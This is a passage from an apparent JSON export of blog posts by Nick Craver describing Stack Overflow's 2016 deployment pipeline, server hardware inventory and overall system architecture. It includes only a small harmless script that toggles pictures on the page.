fail in. At the end of this step (in production), 7 of 9 web servers are typically online and serving users. The last 2 will finish their spin-up shortly after. The step takes about 2 minutes for 9 servers. But yay, our code is live! Now we\u2019re free to deploy again for that bug we probably just sent out. Step 9: New Strings Hook This dev-only step isn\u2019t particularly interesting, but useful. All it does is call a webhook telling it that some new strings were present in this build if there were any. The hook target triggers an upload to our translation service to tighten the iteration time on translations (similar to our chat mechanism above). It\u2019s last because strictly speaking it\u2019s optional and we don\u2019t want it to interfere. That\u2019s it. Dev build complete. Put away the rolly chairs and swords. Tiers What we covered above was the entire development CI build with all the things\u2122. All of the translation bits are development only because we just need to get the strings once. The meta and production builds are a simpler subset of the steps. Here\u2019s a simple visualization that compares the build steps across tiers:  Build StepDevMetaProd 1 - Migrate Sites DB 2 - Migrate Q&A DBs 3 - Find MoonSpeak Tools 4 - Translation Dump (JavaScript) 5 - MSBuild (Compile Compress and Minify) 6 - Translation Dump (C#) 7 - Translations Import English Strings 8 - Deploy Website 9 - New Strings Hook   What do the tiers really translate to? All of our development sites are on WEB10 and WEB11 servers (under different application pools and websites). Meta runs on WEB10 and WEB11 servers, this is specifically meta.stackexchange.com and meta.stackoverflow.com. Production (all other Q&A sites and metas) like Stack Overflow are on WEB01-WEB09. Note: we do a chat notification for build as someone goes through the tiers. Here\u2019s me (against all sane judgement) building out some changes at 5:17pm on a Friday. Don\u2019t try this at home, I\u2019m a professional. Sometimes. Not often.  Database Migrations See? I promised we\u2019d come back to these. To reiterate: if new code is needed to handle the database migrations, it must be deployed first.  In practice though, you\u2019re likely dropping a table, or adding a table/column. For the removal case, we remove it from code, deploy, then deploy again (or later) with the drop migration. For the addition case, we would typically add it as nullable or unused in code. If it needs to be not null, a foreign key, etc. we\u2019d do that in a later deploy as well. The database migrator we use is a very simple repo we could open source, but honestly, there are dozens out there and the \u201csame migration against n databases\u201d is fairly specific. The others are probably much better and ours is very specific to only our needs. The migrator connects to the Sites database, gets the list of databases to run against, and executes all migrations against every one (running multiple databases in parallel). This is done by looking at the passed-in migrations folder and loading it (once) as well as hashing the contents of every file. Each database has a Migrations table that keeps track of what has already been run. It looks like this (descending order):  Note that the above aren\u2019t all in file number order. That\u2019s because 724 and 725 were in a branch for a few days. That\u2019s not an issue, order is not guaranteed. Each migration itself is written to be idempotent, e.g. \u201cdon\u2019t try to add the column if it\u2019s already there\u201d, but the specific order isn\u2019t usually relevant. Either they\u2019re all per-feature, or they\u2019re actually going in-order anyway. The migrator respects the GO operator to separate batches and by default runs all migrations in a transaction. The transaction behavior can be changed with a first-line comment in the .sql file: -- no transaction --. Perhaps the most useful explanation to the migrator is the README.md I wrote for it. Here it is in the Gist. In memory, we compare the list of migrations that already ran to those needing to run then execute what needs running, in file order. If we find the hash of a filename doesn\u2019t match the migration with the same file name in the table, we abort as a safety measure. We can --force to resolve this in the rare cases a migration should have changed (almost always due to developer error). After all migrations have run, we\u2019re done. Rollbacks. We rarely do them. In fact, I can\u2019t remember ever having done one. We avoid them through the approach in general: we deploy small and often. It\u2019s often quicker to fix code and deploy than reverse a migration, especially across hundreds of databases. We also make development mimic production as often as possible, restoring production data periodically. If we needed to reverse something, we could just push another migration negating whatever we did that went boom. The tooling has no concept of rollback though. Why roll back when you can roll forward? Localization/Translations (Moonspeak) This will get its own post, but I wanted to hint at why we do all of this work at compile time. After all, I always advocate strongly for simplicity (yep, even in this 6,000-word blog post - the irony is not lost on me). You should only do something more complicated when you need to do something more complicated. This is one of those cases, for performance. Samo does a lot of work to make our localizations have as little runtime impact as possible. We\u2019ll gladly trade a bit of build complexity to make that happen. While there are options such as .resx files or the new localization in ASP.NET Core 1.0, most of these allocate more than necessary especially with tokenized strings. Here\u2019s what strings look like in our code:  And here\u2019s what that line looks like compiled (via Reflector):  \u2026and most importantly, the compiled implementation:  Note that we aren\u2019t allocating the entire string together, only the pieces (with most interned). This may seem like a small thing, but at scale that\u2019s a huge number of allocations and a lot of time in a garbage collector. I\u2019m sure that just raises a ton of questions about how Moonspeak works. If so, go vote it up. It\u2019s a big topic in itself, I only wanted to justify the compile-time complication it adds here. To us, it\u2019s worth it. Building Without Breaking A question I\u2019m often asked is how we prevent breaks while rolling out new code constantly. Here are some common things we run into and how we avoid them.  Cache object changes:      If we have a cache object that totally changes. That\u2019s a new cache key and we let the old one fall out naturally with time. If we have a cache object that only changes locally (in-memory): nothing to do. The new app domain doesn\u2019t collide. If we have a cache object that changes in redis, then we need to make sure the old and new protobuf signatures are compatible\u2026or change the key.   Tag Engine:      The tag engine reloads on every build (currently). This is triggered by checking every minute for a new build hash on the web tier. If one is found, the application \\bin and a few configs are downloaded to the Stack Server host process and spun up as a new app domain. This sidesteps the need for a deploy to those boxes and keeps local development setup simple (we run no separate process locally). This one is changing drastically soon, since reloading every build is way more often that necessary. We\u2019ll be moving to a more traditional deploy-it-when-it-changes model there soon. Possibly using GPUs. Stay tuned.   Renaming SQL objects:      \u201cDoctor it hurts when I do that!\u201d \u201cDon\u2019t do that.\u201d We may add and migrate, but a live rename is almost certain to cause an outage of some sort. We don\u2019t do that outside of dev.   APIs:      Deploy the new endpoint before the new consumer. If changing an existing endpoint, it\u2019s usually across 3 deploys: add (endpoint), migrate (consumer), cleanup (endpoint).   Bugs:      Try not to deploy bugs. If you screw up, try not to do it the same way twice. Accept that crap happens, live, learn, and move on.    That\u2019s all of the major bits of our deployment process. But as always, ask any questions you have in comments below and you\u2019ll get an answer. I want to take a minute and thank the teams at Stack Overflow here. We build all of this, together. Many people help me review these blog posts before they go out to make sure everything is accurate. The posts are not short, and several people are reviewing them in off-hours because they simply saw a post in chat and wanted to help out. These same people hop into comment threads here, on Reddit, on Hacker News, and other places discussions pop up. They answer questions as they arise or relay them to someone who can answer. They do this on their own, out of a love for the community. I\u2019m tremendously appreciative of their effort and it\u2019s a privilege to work with some of the best programmers and sysadmins in the world. My lovely wife Elise also gives her time to help edit these before they go live. To all of you: thanks. What\u2019s next? The way this series works is I blog in order of what the community wants to know about most. Going by the Trello board, it looks like Monitoring is the next most interesting topic. So next time expect to learn how we monitor all of the systems here at Stack. I\u2019ll cover how we monitor servers and services as well as the performance of Stack Overflow 24/7 as users see it all over the world. I\u2019ll also cover many of the monitoring tools we\u2019re using and have built; we\u2019ve open sourced several big ones. Thanks for reading this post which ended up way longer than I envisioned and see you next time.", "content": "", "cover_photo_url": "https://nickcraver.com/blog/content/SO-Deployment-Dev-Build-Steps.png", "profile": 2, "updated_on": "2016-05-03T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 7293.7587411, "slug": "stack-overflow-how-we-do-deployment-2016-edition-146", "topics": [61]}}, {"model": "app.post", "pk": 147, "fields": {"title": "Stack Overflow: The Hardware - 2016 Edition", "link": "https://nickcraver.com/blog/2016/03/29/stack-overflow-the-hardware-2016-edition/", "source": 1, "normalized_link": "nickcraver.com/blog/2016/03/29/stack-overflow-the-hardware-2016-edition", "summary": " This is #2 in a very long series of posts on Stack Overflow\u2019s architecture. Previous post (#1): Stack Overflow: The Architecture - 2016 Edition Next post (#3): Stack Overflow: How We Do Deployment - 2016 Edition  Who loves hardware? Well, I do and this is my blog so I win. If you don\u2019t love hardware then I\u2019d go ahead and close the browser. Still here? Awesome. Or your browser is crazy slow, in which case you should think about some new hardware. I\u2019ve repeated many, many times: performance is a feature. Since your code is only as fast as the hardware it runs on, the hardware definitely matters. Just like any other platform, Stack Overflow\u2019s architecture comes in layers. Hardware is the foundation layer for us, and having it in-house affords us many luxuries not available in other scenarios\u2026like running on someone else\u2019s servers. It also comes with direct and indirect costs. But that\u2019s not the point of this post, that comparison will come later. For now, I want to provide a detailed inventory of our infrastructure for reference and comparison purposes. And pictures of servers. Sometimes naked servers. This web page could have loaded much faster, but I couldn\u2019t help myself. In many posts through this series I will give a lot of numbers and specs. When I say \u201cour SQL server utilization is almost always at 5\u201310% CPU,\u201d well, that\u2019s great. But, 5\u201310% of what? That\u2019s when we need a point of reference. This hardware list is meant to both answer those questions and serve as a source for comparison when looking at other platforms and what utilization may look like there, how much capacity to compare to, etc.  How We Do Hardware Disclaimer: I don\u2019t do this alone. George Beech (@GABeech) is my main partner in crime when speccing hardware here at Stack. We carefully spec out each server for its intended purpose. What we don\u2019t do is order in bulk and assign tasks later. We\u2019re not alone in this process though; you have to know what\u2019s going to run on the hardware to spec it optimally. We\u2019ll work with the developer(s) and/or other site reliability engineers to best accommodate what is intended live on the box. We\u2019re also looking at what\u2019s best in the system. Each server is not an island. How it fits into the overall architecture is definitely a consideration. What services can share this platform? This data store? This log system? There is inherent value in managing fewer things, or at least fewer variations of anything. When we spec out our hardware, we look at a myriad of requirements that help determine what to order. I\u2019ve never really written this mental checklist down, so let\u2019s give it a shot:  Is this a scale up or scale out problem? (Are we buying one bigger machine or a few smaller ones?)      How much redundancy do we need/want? (How much headroom and failover capability?)   Storage:      Will this server/application touch disk? (Do we need anything besides the spinny OS drives?)          If so, how much? (How much bandwidth? How many small files? Does it need SSDs?) If SSDs, what\u2019s the write load? (Are we talking Intel S3500/3700s? P360x? P3700s?)              How much SSD capacity do we need? (And should it be a 2-tier solution with HDDs as well?) Is this data totally transient? (Are SSDs without capacitors, which are far cheaper, a better fit?)     Will the storage needs likely expand? (Do we get a 1U/10-bay server or a 2U/26-bay server?) Is this a data warehouse type scenario? (Are we looking at 3.5\u201d drives? If so, in a 12 or 16 drives per 2U chassis?)          Is the storage trade-off for the 3.5\u201d backplane worth the 120W TDP limit on processing?   Do we need to expose the disks directly? (Does the controller need to support pass-through?)   Memory:      How much memory does it need? (What must we buy?) How much memory could it use? (What\u2019s reasonable to buy?) Do we think it will need more memory later? (What memory channel configuration should we go with?) Is this a memory-access-heavy application? (Do we want to max out the clock speed?)          Is it highly parallel access? (Do we want to spread the same space across more DIMMs?)     CPU:      What kind of processing are we looking at? (Do we need base CPUs or power?) Is it heavily parallel? (Do we want fewer, faster cores? Or, does it call for more, slower cores?)          In what ways? Will there be heavy L2/L3 cache contention? (Do we need a huge L3 cache for performance?)   Is it mostly single core performance? (Do we want maximum clock?)          If so, how many processes at once? (Which turbo spread do we want here?)     Network:      Do we need additional 10Gb network connectivity? (Is this a \u201cthrough\u201d machine, such as a load balancer?) How much balance do we need on Tx/Rx buffers? (What CPU core count balances best?)   Redundancy:      Do we need servers in the DR data center as well?          Do we need the same number, or is less redundancy acceptable?     Do we need a power cord? No. No we don\u2019t.  Now, let\u2019s see what hardware in our New York QTS data center serves the sites. Secretly, it\u2019s really New Jersey, but let\u2019s just keep that between us. Why do we say it\u2019s the NY data center? Because we don\u2019t want to rename all those NY- servers. I\u2019ll note in the list below when and how Denver differs slightly in specs or redundancy levels. Hide Pictures (in case you\u2019re using this as a hardware reference list later) Servers Running Stack Overflow & Stack Exchange Sites A few global truths so I need not repeat them in each server spec below:  OS drives are not included unless they\u2019re special. Most servers use a pair of 250 or 500GB SATA HDDs for the OS partition, always in a RAID 1. Boot time is not a concern we have and even if it were, the vast majority of our boot time on any physical server isn\u2019t dependent on drive speed (for example, checking 768GB of memory). All servers are connected by 2 or more 10Gb network links in active/active LACP. All servers run on 208V single phase power (via 2 PSUs feeding from 2 PDUs backed by 2 sources). All servers in New York have cable arms, all servers in Denver do not (local engineer\u2019s preference). All servers have both an iDRAC connection (via the management network) and a KVM connection.  Network  2x Cisco Nexus 5596UP core switches (96 SFP+ ports each at 10 Gbps) 10x Cisco Nexus 2232TM Fabric Extenders (2 per rack - each has 32 BASE-T ports each at 10Gbps + 8 SFP+ 10Gbps uplinks) 2x Fortinet 800C Firewalls 2x Cisco ASR-1001 Routers 2x Cisco ASR-1001-x Routers 6x Cisco 2960S-48TS-L Management network switches (1 Per Rack - 48 1Gbps ports + 4 SFP 1Gbps) 1x Dell DMPU4032 KVM 7x Dell DAV2216 KVM Aggregators (1\u20132 per rack - each uplinks to the DPMU4032)  Note: Each FEX has 80 Gbps of uplink bandwidth to its core, and the cores have a 160 Gbps port channel between them. Due to being a more recent install, the hardware in our Denver data center is slightly newer. All 4 routers are ASR-1001-x models and the 2 cores are Cisco Nexus 56128P, which have 96 SFP+ 10Gbps ports and 8 QSFP+ 40Gbps ports each. This saves 10Gbps ports for future expansion since we can bond the cores with 4x 40Gbps links, instead of eating 16x 10Gbps ports as we do in New York.  Here\u2019s what the network gear looks like in New York:    \u2026and in Denver:   Give a shout to Mark Henderson, one of our Site Reliability Engineers who made a special trip to the New York DC to get me some high-res, current photos for this post.  SQL Servers (Stack Overflow Cluster)  2 Dell R720xd Servers, each with: Dual E5-2697v2 Processors (12 cores @2.7\u20133.5GHz each) 384 GB of RAM (24x 16 GB DIMMs) 1x Intel P3608 4 TB NVMe PCIe SSD (RAID 0, 2 controllers per card) 24x Intel 710 200 GB SATA SSDs (RAID 10) Dual 10 Gbps network (Intel X540/I350 NDC)  SQL Servers (Stack Exchange \u201c\u2026and everything else\u201d Cluster)  2 Dell R730xd Servers, each with: Dual E5-2667v3 Processors (8 cores @3.2\u20133.6GHz each) 768 GB of RAM (24x 32 GB DIMMs) 3x Intel P3700 2 TB NVMe PCIe SSD (RAID 0) 24x 10K Spinny 1.2 TB SATA HDDs (RAID 10) Dual 10 Gbps network (Intel X540/I350 NDC)  Note: Denver SQL hardware is identical in spec, but there is only 1 SQL server for each corresponding pair in New York.  Here\u2019s what the SQL Servers in New York looked like while getting their PCIe SSD upgrades in February:    Web Servers  11 Dell R630 Servers, each with: Dual E5-2690v3 Processors (12 cores @2.6\u20133.5GHz each) 64 GB of RAM (8x 8 GB DIMMs) 2x Intel 320 300GB SATA SSDs (RAID 1) Dual 10 Gbps network (Intel X540/I350 NDC)      Service Servers (Workers)  2 Dell R630 Servers, each with:      Dual E5-2643 v3 Processors (6 cores @3.4\u20133.7GHz each) 64 GB of RAM (8x 8 GB DIMMs)   1 Dell R620 Server, with:      Dual E5-2667 Processors (6 cores @2.9\u20133.5GHz each) 32 GB of RAM (8x 4 GB DIMMs)   2x Intel 320 300GB SATA SSDs (RAID 1) Dual 10 Gbps network (Intel X540/I350 NDC)  Note: NY-SERVICE03 is still an R620, due to not being old enough for replacement at the same time. It will be upgraded later this year. Redis Servers (Cache)  2 Dell R630 Servers, each with: Dual E5-2687W v3 Processors (10 cores @3.1\u20133.5GHz each) 256 GB of RAM (16x 16 GB DIMMs) 2x Intel 520 240GB SATA SSDs (RAID 1) Dual 10 Gbps network (Intel X540/I350 NDC)  Elasticsearch Servers (Search)  3 Dell R620 Servers, each with: Dual E5-2680 Processors (8 cores @2.7\u20133.5GHz each) 192 GB of RAM (12x 16 GB DIMMs) 2x Intel S3500 800GB SATA SSDs (RAID 1) Dual 10 Gbps network (Intel X540/I350 NDC)  HAProxy Servers (Load Balancers)  2 Dell R620 Servers (CloudFlare Traffic), each with:      Dual E5-2637 v2 Processors (4 cores @3.5\u20133.8GHz each) 192 GB of RAM (12x 16 GB DIMMs) 6x Seagate Constellation 7200RPM 1TB SATA HDDs (RAID 10) (Logs) Dual 10 Gbps network (Intel X540/I350 NDC) - Internal (DMZ) Traffic Dual 10 Gbps network (Intel X540) - External Traffic   2 Dell R620 Servers (Direct Traffic), each with:      Dual E5-2650 Processors (8 cores @2.0\u20132.8GHz each) 64 GB of RAM (4x 16 GB DIMMs) 2x Seagate Constellation 7200RPM 1TB SATA HDDs (RAID 10) (Logs) Dual 10 Gbps network (Intel X540/I350 NDC) - Internal (DMZ) Traffic Dual 10 Gbps network (Intel X540) - External Traffic    Note: These servers were ordered at different times and as a result, differ in spec. Also, the two CloudFlare load balancers have more memory for a memcached install (which we no longer run today) for CloudFlare\u2019s Railgun.  The service, redis, search, and load balancer boxes above are all 1U servers in a stack. Here\u2019s what that stack looks like in New York:    Servers for Other Bits We have other servers not directly or indirectly involved in serving site traffic. These are either only tangentially related (e.g., domain controllers which are seldom used for application pool authentication and run as VMs) or are for nonessential purposes like monitoring, log storage, backups, etc. Since this post is meant to be an appendix for many future posts in the series, I\u2019m including all of the interesting \u201cbackground\u201d servers as well. This also lets me share more server porn with you, and who doesn\u2019t love that? VM Servers (VMWare, Currently)  2 Dell FX2s Blade Chassis, each with 2 of 4 blades populated      4 Dell FC630 Blade Servers (2 per chassis), each with:          Dual E5-2698 v3 Processors (16 cores @2.3\u20133.6GHz each) 768 GB of RAM (24x 32 GB DIMMs) 2x 16GB SD Cards (Hypervisor - no local storage)   Dual 4x 10 Gbps network (FX IOAs - BASET)   1 EqualLogic PS6210X iSCSI SAN      24x Dell 10K RPM 1.2TB SAS HDDs (RAID10) Dual 10Gb network (10-BASET)   1 EqualLogic PS6110X iSCSI SAN      24x Dell 10K RPM 900GB SAS HDDs (RAID10) Dual 10Gb network (SFP+)        There a few more noteworthy servers behind the scenes that aren\u2019t VMs. These perform background tasks, help us troubleshoot with logging, store tons of data, etc. Machine Learning Servers (Providence) These servers are idle about 99% of the time, but do heavy lifting for a nightly processing job: refreshing Providence. They also serve as an inside-the-datacenter place to test new algorithms on large datasets.  2 Dell R620 Servers, each with: Dual E5-2697 v2 Processors (12 cores @2.7\u20133.5GHz each) 384 GB of RAM (24x 16 GB DIMMs) 4x Intel 530 480GB SATA SSDs (RAID 10) Dual 10 Gbps network (Intel X540/I350 NDC)  Machine Learning Redis Servers (Still Providence) This is the redis data store for Providence. The usual setup is one master, one slave, and one instance used for testing the latest version of our ML algorithms. While not used to serve the Q&A sites, this data is used when serving job matches on Careers as well as the sidebar job listings.  3 Dell R720xd Servers, each with: Dual E5-2650 v2 Processors (8 cores @2.6\u20133.4GHz each) 384 GB of RAM (24x 16 GB DIMMs) 4x Samsung 840 Pro 480 GB SATA SSDs (RAID 10) Dual 10 Gbps network (Intel X540/I350 NDC)  Logstash Servers (For ya know\u2026logs) Our Logstash cluster (using Elasticsearch for storage) stores logs from, well, everything. We plan to replicate HTTP logs in here but are hitting performance issues. However, we do aggregate all network device logs, syslogs, and Windows and Linux system logs here so we can get a network overview or search for issues very quickly. This is also used as a data source in Bosun to get additional information when alerts fire. The total cluster\u2019s raw storage is 6x12x4 = 288 TB.  6 Dell R720xd Servers, each with: Dual E5-2660 v2 Processors (10 cores @2.2\u20133.0GHz each) 192 GB of RAM (12x 16 GB DIMMs) 12x 7200 RPM Spinny 4 TB SATA HDDs (RAID 0 x3 - 4 drives per) Dual 10 Gbps network (Intel X540/I350 NDC)  HTTP Logging SQL Server This is where we log every single HTTP hit to our load balancers (sent from HAProxy via syslog) to a SQL database. We only record a few top level bits like URL, Query, UserAgent, timings for SQL, Redis, etc. in here \u2013 so it all goes into a Clustered Columnstore Index per day. We use this for troubleshooting user issues, detecting botnets, etc.  1 Dell R730xd Server with: Dual E5-2660 v3 Processors (10 cores @2.6\u20133.3GHz each) 256 GB of RAM (16x 16 GB DIMMs) 2x Intel P3600 2 TB NVMe PCIe SSD (RAID 0) 16x Seagate ST6000NM0024 7200RPM Spinny 6 TB SATA HDDs (RAID 10) Dual 10 Gbps network (Intel X540/I350 NDC)  Development SQL Server We like for dev to simulate production as much as possible, so SQL matches as well\u2026or at least it used to. We\u2019ve upgraded production processors since this purchase. We\u2019ll be refreshing this box with a 2U solution at the same time as we upgrade the Stack Overflow cluster later this year.  1 Dell R620 Server with: Dual E5-2620 Processors (6 cores @2.0\u20132.5GHz each) 384 GB of RAM (24x 16 GB DIMMs) 8x Intel S3700 800 GB SATA SSDs (RAID 10) Dual 10 Gbps network (Intel X540/I350 NDC)   That\u2019s it for the hardware actually serving the sites or that\u2019s generally interesting. We, of course, have other servers for the background tasks such as logging, monitoring, backups, etc. If you\u2019re especially curious about specs of any other systems, just ask in comments and I\u2019m happy to detail them out. Here\u2019s what the full setup looks like in New York as of a few weeks ago:   What\u2019s next? The way this series works is I blog in order of what the community wants to know about most. Going by the Trello board, it looks like Deployment is the next most interesting topic. So next time expect to learn how code goes from a developers machine to production and everything involved along the way. I\u2019ll cover database migrations, rolling builds, CI infrastructure, how our dev environment is set up, and share stats on all things deployment.  (function () {     var pics = document.querySelectorAll('.pics-stack-overflow-the-hardware-2016-edition'), a = document.querySelector('.toggle-stack-overflow-the-hardware-2016-edition');     a.addEventListener('click', function(e) {          e.preventDefault();         var hide = this.innerHTML === 'Hide Pictures';         for (var i = 0; i < pics.length; i++) {             pics[i].style.display = hide ? 'none' : 'block';         }         this.innerHTML = hide ? 'Show Pictures' : 'Hide Pictures';         localStorage.setItem('hide-stack-overflow-the-hardware-2016-edition', hide);         return false;     }, false);     if (localStorage.getItem('hide-stack-overflow-the-hardware-2016-edition') === 'true') {         a.dispatchEvent(new Event('click'));     } })(); ", "content": "", "cover_photo_url": "https://nickcraver.com/blog/content/SO-Hardware-Racks2-Small.jpg", "profile": 2, "updated_on": "2016-03-29T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 7226.5587411, "slug": "stack-overflow-the-hardware-2016-edition-147", "topics": [61]}}, {"model": "app.post", "pk": 148, "fields": {"title": "Stack Overflow: The Architecture - 2016 Edition", "link": "https://nickcraver.com/blog/2016/02/17/stack-overflow-the-architecture-2016-edition/", "source": 1, "normalized_link": "nickcraver.com/blog/2016/02/17/stack-overflow-the-architecture-2016-edition", "summary": " This is #1 in a very long series of posts on Stack Overflow\u2019s architecture. Welcome. Previous post (#0): Stack Overflow: A Technical Deconstruction Next post (#2): Stack Overflow: The Hardware - 2016 Edition  To get an idea of what all of this stuff \u201cdoes,\u201d let me start off with an update on the average day at Stack Overflow. So you can compare to the previous numbers from November 2013, here\u2019s a day of statistics from February 9th, 2016 with differences since November 12th, 2013:  209,420,973 (+61,336,090) HTTP requests to our load balancer 66,294,789 (+30,199,477) of those were page loads 1,240,266,346,053 (+406,273,363,426) bytes (1.24 TB) of HTTP traffic sent 569,449,470,023 (+282,874,825,991) bytes (569 GB) total received 3,084,303,599,266 (+1,958,311,041,954) bytes (3.08 TB) total sent 504,816,843 (+170,244,740) SQL Queries (from HTTP requests alone) 5,831,683,114 (+5,418,818,063) Redis hits 17,158,874 (not tracked in 2013) Elastic searches 3,661,134 (+57,716) Tag Engine requests 607,073,066 (+48,848,481) ms (168 hours) spent running SQL queries 10,396,073 (-88,950,843) ms (2.8 hours) spent on Redis hits 147,018,571 (+14,634,512) ms (40.8 hours) spent on Tag Engine requests 1,609,944,301 (-1,118,232,744) ms (447 hours) spent processing in ASP.Net 22.71 (-5.29) ms average (19.12 ms in ASP.Net) for 49,180,275 question page renders 11.80 (-53.2) ms average (8.81 ms in ASP.Net) for 6,370,076 home page renders  You may be wondering about the drastic ASP.Net reduction in processing time compared to 2013 (which was 757 hours) despite 61 million more requests a day. That\u2019s due to both a hardware upgrade in early 2015 as well as a lot of performance tuning inside the applications themselves. Please don\u2019t forget: performance is still a feature. If you\u2019re curious about more hardware specifics than I\u2019m about to provide\u2014fear not. The next post will be an appendix with detailed hardware specs for all of the servers that run the sites (I\u2019ll update this with a link when it\u2019s live).  So what\u2019s changed in the last 2 years? Besides replacing some servers and network gear, not much. Here\u2019s a top-level list of hardware that runs the sites today (noting what\u2019s different since 2013):  4 Microsoft SQL Servers (new hardware for 2 of them) 11 IIS Web Servers (new hardware) 2 Redis Servers (new hardware) 3 Tag Engine servers (new hardware for 2 of the 3) 3 Elasticsearch servers (same) 4 HAProxy Load Balancers (added 2 to support CloudFlare) 2 Networks (each a Nexus 5596 Core + 2232TM Fabric Extenders, upgraded to 10Gbps everywhere) 2 Fortinet 800C Firewalls (replaced Cisco 5525-X ASAs) 2 Cisco ASR-1001 Routers (replaced Cisco 3945 Routers) 2 Cisco ASR-1001-x Routers (new!)  What do we need to run Stack Overflow? That hasn\u2019t changed much since 2013, but due to the optimizations and new hardware mentioned above, we\u2019re down to needing only 1 web server. We have unintentionally tested this, successfully, a few times. To be clear: I\u2019m saying it works. I\u2019m not saying it\u2019s a good idea. It\u2019s fun though, every time. Now that we have some baseline numbers for an idea of scale, let\u2019s see how we make those fancy web pages. Since few systems exist in complete isolation (and ours is no exception), architecture decisions often make far less sense without a bigger picture of how those pieces fit into the whole. That\u2019s the goal here, to cover the big picture. Many subsequent posts will do deep dives into specific areas. This will be a logistical overview with hardware highlights only; the next post will have the hardware details. For those of you here to see what the hardware looks like these days, here are a few pictures I took of rack A (it has a matching sister rack B) during our February 2015 upgrade:     \u2026and if you\u2019re into that kind of thing, here\u2019s the entire 256 image album from that week (you\u2019re damn right that number\u2019s intentional). Now, let\u2019s dig into layout. Here\u2019s a logical overview of the major systems in play:  Ground Rules Here are some rules that apply globally so I don\u2019t have to repeat them with every setup:  Everything is redundant. All servers and network gear have at least 2x 10Gbps connectivity. All servers have 2 power feeds via 2 power supplies from 2 UPS units backed by 2 generators and 2 utility feeds. All servers have a redundant partner between rack A and B. All servers and services are doubly redundant via another data center (Colorado), though I\u2019m mostly talking about New York here. Everything is redundant.  The Internets First, you have to find us\u2014that\u2019s DNS. Finding us needs to be fast, so we farm this out to CloudFlare (currently) because they have DNS servers nearer to almost everyone around the world. We update our DNS records via an API and they do the \u201chosting\u201d of DNS. But since we\u2019re jerks with deeply-rooted trust issues, we still have our own DNS servers as well. Should the apocalypse happen (probably caused by the GPL, Punyon, or caching) and people still want to program to take their mind off of it, we\u2019ll flip them on. After you find our secret hideout, HTTP traffic comes from one of our four ISPs (Level 3, Zayo, Cogent, and Lightower in New York) and flows through one of our four edge routers. We peer with our ISPs using BGP (fairly standard) in order to control the flow of traffic and provide several avenues for traffic to reach us most efficiently. These ASR-1001 and ASR-1001-X routers are in 2 pairs, each servicing 2 ISPs in active/active fashion\u2014so we\u2019re redundant here. Though they\u2019re all on the same physical 10Gbps network, external traffic is in separate isolated external VLANs which the load balancers are connected to as well. After flowing through the routers, you\u2019re headed for a load balancer. I suppose this may be a good time to mention we have a 10Gbps MPLS between our 2 data centers, but it is not directly involved in serving the sites. We use this for data replication and quick recovery in the cases where we need a burst. \u201cBut Nick, that\u2019s not redundant!\u201d Well, you\u2019re technically correct (the best kind of correct), that\u2019s a single point of failure on its face. But wait! We maintain 2 more failover OSPF routes (the MPLS is #1, these are #2 and 3 by cost) via our ISPs. Each of the sets mentioned earlier connects to the corresponding set in Colorado, and they load balance traffic between in the failover situation. We could make both sets connect to both sets and have 4 paths but, well, whatever.  Moving on. Load Balancers (HAProxy) The load balancers are running HAProxy 1.5.15 on CentOS 7, our preferred flavor of Linux. TLS (SSL) traffic is also terminated in HAProxy. We\u2019ll be looking hard at HAProxy 1.7 soon for HTTP/2 support. Unlike all other servers with a dual 10Gbps LACP network link, each load balancer has 2 pairs of 10Gbps: one for the external network and one for the DMZ. These boxes run 64GB or more of memory to more efficiently handle SSL negotiation. When we can cache more TLS sessions in memory for reuse, there\u2019s less to recompute on subsequent connections to the same client. This means we can resume sessions both faster and cheaper. Given that RAM is pretty cheap dollar-wise, it\u2019s an easy choice. The load balancers themselves are a pretty simple setup. We listen to different sites on various IPs (mostly for certificate concerns and DNS management) and route to various backends based mostly on the host header. The only things of note we do here is rate limiting and some header captures (sent from our web tier) into the HAProxy syslog message so we can record performance metrics for every single request. We\u2019ll cover that later too. Web Tier (IIS 8.5, ASP.Net MVC 5.2.3, and .Net 4.6.1) The load balancers feed traffic to 9 servers we refer to as \u201cprimary\u201d (01-09) and 2 \u201cdev/meta\u201d (10-11, our staging environment) web servers. The primary servers run things like Stack Overflow, Careers, and all Stack Exchange sites except meta.stackoverflow.com and meta.stackexchange.com, which run on the last 2 servers. The primary Q&A Application itself is multi-tenant. This means that a single application serves the requests for all Q&A sites. Put another way: we can run the entire Q&A network off of a single application pool on a single server. Other applications like Careers, API v2, Mobile API, etc. are separate. Here\u2019s what the primary and dev tiers look like in IIS:     Here\u2019s what Stack Overflow\u2019s distribution across the web tier looks like in Opserver (our internal monitoring dashboard):  \u2026and here\u2019s what those web servers look like from a utilization perspective:  I\u2019ll go into why we\u2019re so overprovisioned in future posts, but the highlight items are: rolling builds, headroom, and redundancy. Service Tier (IIS, ASP.Net MVC 5.2.3, .Net 4.6.1, and HTTP.SYS) Behind those web servers is the very similar \u201cservice tier.\u201d It\u2019s also running IIS 8.5 on Windows 2012R2. This tier runs internal services to support the production web tier and other internal systems. The two big players here are \u201cStack Server\u201d which runs the tag engine and is based on http.sys (not behind IIS) and the Providence API (IIS-based). Fun fact: I have to set affinity on each of these 2 processes to land on separate sockets because Stack Server just steamrolls the L2 and L3 cache when refreshing question lists on a 2-minute interval. These service boxes do heavy lifting with the tag engine and backend APIs where we need redundancy, but not 9x redundancy. For example, loading all of the posts and their tags that change every n minutes from the database (currently 2) isn\u2019t that cheap. We don\u2019t want to do that load 9 times on the web tier; 3 times is enough and gives us enough safety. We also configure these boxes differently on the hardware side to be better optimized for the different computational load characteristics of the tag engine and elastic indexing jobs (which also run here). The \u201ctag engine\u201d is a relatively complicated topic in itself and will be a dedicated post. The basics are: when you visit /questions/tagged/java, you\u2019re hitting the tag engine to see which questions match. It does all of our tag matching outside of /search, so the new navigation, etc. are all using this service for data. Cache & Pub/Sub (Redis) We use Redis for a few things here and it\u2019s rock solid. Despite doing about 160 billion ops a month, every instance is below 2% CPU. Usually much lower:  We have an L1/L2 cache system with Redis. \u201cL1\u201d is HTTP Cache on the web servers or whatever application is in play. \u201cL2\u201d is falling back to Redis and fetching the value out. Our values are stored in the Protobuf format, via protobuf-dot-net by Marc Gravell. For a client, we\u2019re using StackExchange.Redis\u2014written in-house and open source. When one web server gets a cache miss in both L1 and L2, it fetches the value from source (a database query, API call, etc.) and puts the result in both local cache and Redis. The next server wanting the value may miss L1, but would find the value in L2/Redis, saving a database query or API call. We also run many Q&A sites, so each site has its own L1/L2 caching: by key prefix in L1 and by database ID in L2/Redis. We\u2019ll go deeper on this in a future post. Alongside the 2 main Redis servers (master/slave) that run all the site 